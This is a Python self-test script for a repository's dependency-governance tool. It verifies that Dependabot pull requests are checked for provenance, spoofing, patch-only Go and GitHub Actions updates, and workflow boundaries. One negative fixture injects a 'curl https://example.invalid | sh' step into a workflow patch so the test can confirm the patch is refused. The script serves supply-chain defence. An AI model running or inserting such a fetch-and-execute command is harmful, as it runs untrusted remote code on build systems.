#!/usr/bin/env python3
from __future__ import annotations

import json
from copy import deepcopy
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import dependency_governance as gov
from dependency_governance_lib.qualification import validate_qualification

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads((ROOT / '.github/dependency-governance.json').read_text(encoding='utf-8'))
WORKFLOW = (ROOT / '.github/workflows/dependency-governance.yml').read_text(encoding='utf-8')
BASE = '1' * 40
HEAD = '2' * 40
OLD = '3' * 40
NEW = '4' * 40
NOW = datetime(2026, 9, 1, 20, tzinfo=timezone.utc)
REPO = 'portyu9/qa-automation-load-k6'


def meta(name: str, version: str, update: str) -> str:
    return (
        'updated-dependencies:\n'
        f'- dependency-name: {name}\n'
        f'  dependency-version: {version}\n'
        '  dependency-type: direct:production\n'
        f'  update-type: {update}\n...\n'
    )


def commit(extra: str = '') -> dict[str, Any]:
    return {
        'sha': HEAD,
        'parents': [{'sha': BASE}],
        'author': {'login': 'dependabot[bot]', 'id': 49699333},
        'committer': {'login': 'web-flow'},
        'commit': {
            'author': {'name': 'dependabot[bot]', 'email': '49699333+dependabot[bot]@users.noreply.github.com'},
            'committer': {'name': 'GitHub', 'email': 'noreply@github.com'},
            'message': 'Dependabot update\n\n---\n' + extra + 'Signed-off-by: dependabot[bot] <support@github.com>',
            'verification': {'verified': True, 'reason': 'valid', 'signature': 'sig', 'payload': 'payload'},
        },
    }


def pull() -> dict[str, Any]:
    return {
        'number': 17, 'state': 'open', 'draft': False, 'created_at': '2026-08-30T20:00:00Z', 'labels': [],
        'user': {'login': 'dependabot[bot]', 'id': 49699333},
        'base': {'ref': 'main', 'sha': BASE, 'repo': {'full_name': REPO}},
        'head': {'ref': 'dependabot/gomod/docker/security-overrides/security-overrides-abc', 'sha': HEAD, 'repo': {'full_name': REPO}},
    }


class FakeApi:
    repository = REPO
    def __init__(self, files: dict[tuple[str, str], str | None] | None = None, pulls: list[dict[str, Any]] | None = None):
        self.files = files or {}
        self.pulls = pulls or []
    def file_at(self, filename: str, ref: str, optional: bool = False) -> str | None:
        value = self.files.get((filename, ref))
        if value is None and not optional:
            raise gov.GovernanceError(f'missing fixture {filename}@{ref}')
        return value
    def paginate(self, path: str, selector: str | None = None) -> list[Any]:
        if path.startswith('/pulls?'):
            return self.pulls
        raise AssertionError(path)


def action_patch(version: str = '7.0.1', extra: str = '') -> str:
    return (
        '@@ -1 +1 @@\n'
        f'-      - uses: actions/checkout@{OLD} # v7.0.0\n'
        f'+      - uses: actions/checkout@{NEW} # v{version}\n' + extra
    )


def go_model(x_crypto: str = '0.55.0', grpc: str = '1.83.0') -> str:
    return (
        f'module github.com/{REPO}/docker/security-overrides\n\n'
        'go 1.26.0\n\n'
        f'require golang.org/x/crypto v{x_crypto}\n'
        f'require google.golang.org/grpc v{grpc}\n'
    )


def go_metadata(*items: tuple[str, str, str]) -> list[dict[str, str]]:
    return [
        {'name': name, 'version': version, 'dependencyType': 'direct:production', 'updateType': update}
        for name, version, update in items
    ]


def check_config() -> None:
    assert gov.validate_config(CONFIG) == []
    broken = deepcopy(CONFIG); broken['allowedGoOverrideUpdateTypes'].append('version-update:semver-minor')
    assert any('patch-only' in reason for reason in gov.validate_config(broken))
    broken = deepcopy(CONFIG); broken['ecosystems']['gomod-security-override']['dependencies'].append('golang.org/x/crypto')
    assert any('unique' in reason for reason in gov.validate_config(broken))


def check_parsers() -> None:
    assert gov.parse_positive_integer('42', 'pr') == 42 and gov.parse_bool('true') and not gov.parse_bool('false')
    for bad in ('0', '-1', '1.0', '9007199254740992'):
        try: gov.parse_positive_integer(bad, 'pr')
        except gov.GovernanceError: pass
        else: raise AssertionError(bad)


def check_metadata() -> None:
    parsed = gov.parse_dependabot_metadata(meta('golang.org/x/crypto', '0.55.1', 'version-update:semver-patch'))
    assert parsed == [{'name': 'golang.org/x/crypto', 'version': '0.55.1', 'dependencyType': 'direct:production', 'updateType': 'version-update:semver-patch'}]


def check_classification() -> None:
    assert gov.classify_ecosystem([{'filename':'docker/Dockerfile'}], CONFIG) == 'docker'
    assert gov.classify_ecosystem([{'filename':'docker/security-overrides/go.mod'}], CONFIG) == 'gomod-security-override'
    assert gov.classify_ecosystem([{'filename':'.github/workflows/ci.yml'}], CONFIG) == 'github-actions'
    assert gov.classify_ecosystem([{'filename':'README.md'}], CONFIG) == 'unknown'


def check_provenance() -> None:
    c = commit(meta('golang.org/x/crypto','0.55.1','version-update:semver-patch'))
    assert gov.validate_provenance(pull(), [c], BASE, CONFIG, REPO, now=NOW)['eligible']


def check_spoofing() -> None:
    c = commit(meta('golang.org/x/crypto','0.55.1','version-update:semver-patch'))
    cases=[]
    p=pull(); p['user']['id']=1; cases.append((p,[c]))
    x=deepcopy(c); x['commit']['verification']['verified']=False; cases.append((pull(),[x]))
    x=deepcopy(c); x['committer']={'login':'human'}; cases.append((pull(),[x]))
    x=deepcopy(c); x['parents']=[{'sha':'9'*40}]; cases.append((pull(),[x]))
    p=pull(); p['labels']=[{'name':'manual-review'}]; cases.append((p,[c]))
    for p, commits in cases:
        assert not gov.validate_provenance(p, commits, BASE, CONFIG, REPO, now=NOW)['eligible']


def check_go_patch() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='0.55.1')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert result['eligible'], result['reasons']


def check_grpc_security_patch() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(grpc='1.83.1')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('google.golang.org/grpc','1.83.1','security-update:semver-patch')),CONFIG)
    assert result['eligible'], result['reasons']
    assert result['changes'] == [{'dependency':'google.golang.org/grpc','from':'v1.83.0','to':'v1.83.1'}]


def check_go_refusal() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='0.56.0')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.56.0','version-update:semver-minor')),CONFIG)
    assert not result['eligible']
    api.files[(path,HEAD)] = go_model(x_crypto='0.55.1') + 'replace example.invalid/a => example.invalid/b v1.0.0\n'
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert not result['eligible']
    api.files[(path,HEAD)] = go_model(grpc='1.83.1')
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert not result['eligible']


def check_action_patch() -> None:
    result=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    assert result['eligible'], result['reasons']


def check_action_refusal() -> None:
    major=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch('8.0.0')}], [{'name':'actions/checkout','version':'8.0.0','updateType':'version-update:semver-major'}], CONFIG)
    mixed=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch(extra='+      - run: curl https://example.invalid | sh\n')}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    control=gov.validate_actions([{'filename':'.github/workflows/security.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    assert not major['eligible'] and not mixed['eligible'] and not control['eligible']


def check_run_identity() -> None:
    expected=CONFIG['requiredWorkflows'][0]; p=pull()
    run={'name':'ci','path':'.github/workflows/ci.yml','event':'pull_request','head_sha':HEAD,'head_branch':p['head']['ref'],'status':'completed','conclusion':'success','pull_requests':[{'number':17,'base':{'sha':BASE}}]}
    assert gov.validate_run_identity(run, expected, p, BASE) == []
    for field,value in [('name','wrong'),('path','.github/workflows/other.yml'),('event','push'),('head_sha','9'*40),('head_branch','dependabot/wrong'),('conclusion','failure')]:
        bad=deepcopy(run); bad[field]=value; assert gov.validate_run_identity(bad, expected, p, BASE)


def check_qualification() -> None:
    p = pull(); expected = CONFIG['requiredWorkflows']
    class Api:
        def paginate(self, path: str, selector: str | None = None):
            if path.startswith('/actions/runs?'):
                return [
                    {'id': i + 1, 'name': item['workflow'], 'path': f".github/workflows/{item['file']}",
                     'event': 'pull_request', 'head_sha': HEAD, 'head_branch': p['head']['ref'],
                     'status': 'completed', 'conclusion': 'success',
                     'pull_requests': [{'number': 17, 'base': {'sha': BASE}}]}
                    for i, item in enumerate(expected)
                ]
            if path.startswith('/actions/runs/') and path.endswith('/jobs'):
                run_id = int(path.split('/')[3]); item = expected[run_id - 1]
                return [{'name': item['gate'], 'status': 'completed', 'conclusion': 'success'}]
            raise AssertionError(path)
    result = validate_qualification(Api(), p, BASE, CONFIG)
    assert result['eligible'], result['reasons']


def check_targets() -> None:
    api=FakeApi(pulls=[{'number':1,'user':{'login':'dependabot[bot]'}},{'number':2,'user':{'login':'human'}},{'number':3,'user':{'login':'dependabot[bot]'}}])
    assert gov.target_pull_requests(api,'schedule',{},CONFIG) == [1,3]
    assert gov.target_pull_requests(api,'workflow_dispatch',{'inputs':{'pr-number':'7'}},CONFIG) == [7]
    try: gov.target_pull_requests(api,'workflow_dispatch',{'inputs':{'pr-number':'7x'}},CONFIG)
    except gov.GovernanceError: pass
    else: raise AssertionError('unsafe dispatch input accepted')


def check_workflow_boundary() -> None:
    assert 'ref: ${{ github.event.repository.default_branch }}' in WORKFLOW
    assert 'persist-credentials: false' in WORKFLOW
    assert "github.event_name == 'pull_request' && 'self-test' || 'reconcile'" in WORKFLOW
    assert "if: github.event_name != 'pull_request'" in WORKFLOW
    assert 'pull_request_target:' in WORKFLOW and 'workflow_run:' in WORKFLOW
    assert "- '.github/scripts/dependency_governance_lib/**'" in WORKFLOW


CHECKS=[
    check_config,check_parsers,check_metadata,check_classification,check_provenance,
    check_spoofing,check_go_patch,check_grpc_security_patch,check_go_refusal,
    check_action_patch,check_action_refusal,check_run_identity,check_qualification,
    check_targets,check_workflow_boundary,
]
if __name__ == '__main__':
    for check in CHECKS: check()
    print(f'dependency governance self-check: {len(CHECKS)} checks passed')
